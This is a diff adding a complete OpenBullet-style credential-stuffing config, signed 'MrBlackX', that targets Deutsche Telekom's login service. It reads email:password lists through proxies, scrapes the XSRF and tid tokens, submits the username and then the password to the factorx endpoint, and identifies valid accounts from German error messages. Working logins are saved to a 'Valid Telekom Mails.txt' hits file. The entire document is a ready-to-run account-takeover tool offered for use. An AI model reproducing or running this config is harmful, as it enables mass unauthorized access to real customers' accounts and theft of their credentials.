@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "T E L E K O M",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-29T18:45:40.1103056-08:00",
+  "AdditionalInfo": "Valid Mail Checker ",
+  "Author": "MrBlackX",
+  "Version": "1.3.6 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get_recoures REQUEST GET "https://accounts.login.idm.telekom.com/oauth2/auth?client_id=10LIVESAM30000004901VESPAPICOTELEKOM0000&redirect_uri=https://www.telekom.de/tech/sam/ess/callback&response_type=code&scope=openid&state=61247d86-7ee7-4785-b8fe-9178d539e7e7&display=page" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#xsrf PARSE "<SOURCE>" LR "name=\"xsrf_" "\"" -> VAR "xsrf" 
+
+#xsrf2 PARSE "<SOURCE>" LR "name=\"xsrf_<xsrf>\" value=\"" "\">" -> VAR "xsrf2" 
+
+#tid PARSE "<SOURCE>" LR "name=\"tid\" value=\"" "\"" -> VAR "tid" 
+
+#len_usr FUNCTION Length "xsrf_<xsrf>=<xsrf2>&tid=<tid>&x-show-cancel=false&pw_usr=<USER>&pw_submit=&hidden_pwd=" -> VAR "len_usr" 
+
+#username REQUEST POST "https://accounts.login.idm.telekom.com/factorx" 
+  CONTENT "xsrf_<xsrf>=<xsrf2>&tid=<tid>&x-show-cancel=false&pw_usr=<USER>&pw_submit=&hidden_pwd=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: accounts.login.idm.telekom.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <len_usr>" 
+  HEADER "Origin: https://accounts.login.idm.telekom.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://accounts.login.idm.telekom.com/oauth2/auth?client_id=10LIVESAM30000004901VESPAPICOTELEKOM0000&redirect_uri=https://www.telekom.de/tech/sam/ess/callback&response_type=code&scope=openid&state=61247d86-7ee7-4785-b8fe-9178d539e7e7&display=page" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<div>Benutzername ist nicht korrekt.</div>" 
+  KEYCHAIN Success OR 
+    KEY "pw_pwd" 
+
+#get_recoures REQUEST GET "https://accounts.login.idm.telekom.com/oauth2/auth?client_id=10LIVESAM30000004901VESPAPICOTELEKOM0000&redirect_uri=https://www.telekom.de/tech/sam/ess/callback&response_type=code&scope=openid&state=61247d86-7ee7-4785-b8fe-9178d539e7e7&display=page" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#xsrf PARSE "<SOURCE>" LR "name=\"xsrf_" "\"" -> VAR "xsrf" 
+
+#xsrf2 PARSE "<SOURCE>" LR "name=\"xsrf_<xsrf>\" value=\"" "\">" -> VAR "xsrf2" 
+
+#tid PARSE "<SOURCE>" LR "name=\"tid\" value=\"" "\"" -> VAR "tid" 
+
+#len_pw FUNCTION Length "xsrf_<xsrf>=<xsrf2>&tid=<tid>&hidden_usr=<USER>&pw_pwd=<PASS>&persist_session_displayed=1&pw_submit=" -> VAR "len_pw" 
+
+#password REQUEST POST "https://accounts.login.idm.telekom.com/factorx" 
+  CONTENT "xsrf_<xsrf>=<xsrf2>&tid=&hidden_usr=<USER>&pw_pwd=<PASS>&persist_session_displayed=1&pw_submit=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <len_pw>" 
+  HEADER "Origin: https://accounts.login.idm.telekom.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://accounts.login.idm.telekom.com/factorx" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#check_2 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Passwort ist nicht korrekt" 
+
+UTILITY File "Valid Telekom Mails.txt" AppendLines "[ - - - < V A L I D | M A I L > - - - ]\\n\\nEmail : <USER>\\nPassword: <PASS>\\nMade By @MrBlackX\\n\\n[ - - - < T E L E K O M | C O N F I G > - - - ]\\n" -> VAR "Save Hits" 
+
